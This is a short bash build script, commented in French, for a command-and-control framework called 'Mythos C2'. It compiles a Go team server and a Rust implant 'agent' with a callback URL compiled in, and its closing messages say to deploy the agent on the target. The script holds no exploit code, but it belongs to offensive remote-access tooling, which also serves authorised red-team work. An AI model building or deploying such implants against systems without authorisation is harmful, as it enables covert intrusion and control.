#!/bin/bash
# build.sh — Script de compilation Mythos C2
# Usage : ./build.sh [--target windows|linux] [--c2-url https://...]

set -e

C2_URL="${C2_URL:-http://192.168.249.100:8080}"
TARGET="${1:-windows}"

echo "════════════════════════════════════════════"
echo "  Mythos C2 — Build System"
echo "  C2 URL : $C2_URL"
echo "  Target : $TARGET"
echo "════════════════════════════════════════════"

# ── 1. Compiler le serveur Go ────────────────────────────────
echo "[*] Compilation du team server Go..."
cd server
go mod tidy
go build -o ../dist/mythos-server -ldflags="-s -w" .
echo "[+] Team server compilé → dist/mythos-server"
cd ..

# ── 2. Compiler l'agent Rust ────────────────────────────────
echo "[*] Compilation de l'agent Rust..."
cd agent

if [ "$TARGET" = "windows" ]; then
    # Cross-compilation vers Windows x64 depuis Linux/Mac
    # Prérequis : rustup target add x86_64-pc-windows-gnu
    C2_URL="$C2_URL" cargo build \
        --release \
        --target x86_64-pc-windows-gnu \
        2>/dev/null || {
        echo "[-] Cross-compilation Windows non disponible"
        echo "[-] Pour activer : rustup target add x86_64-pc-windows-gnu"
        echo "[*] Compilation native à la place..."
        C2_URL="$C2_URL" cargo build --release
    }

    if [ -f "target/x86_64-pc-windows-gnu/release/agent.exe" ]; then
        cp target/x86_64-pc-windows-gnu/release/agent.exe ../dist/mythos-agent.exe
        echo "[+] Agent Windows compilé → dist/mythos-agent.exe"
        ls -lh ../dist/mythos-agent.exe
    fi
else
    # Compilation native Linux
    C2_URL="$C2_URL" cargo build --release
    cp target/release/agent ../dist/mythos-agent
    echo "[+] Agent Linux compilé → dist/mythos-agent"
fi

cd ..

echo ""
echo "════════════════════════════════════════════"
echo "[+] Build terminé !"
echo ""
echo "  Démarrer le serveur :"
echo "  ./dist/mythos-server --listener-port 8080 --api-port 8443"
echo ""
echo "  Déployer l'agent sur la cible :"
echo "  ./dist/mythos-agent.exe"
echo "════════════════════════════════════════════"
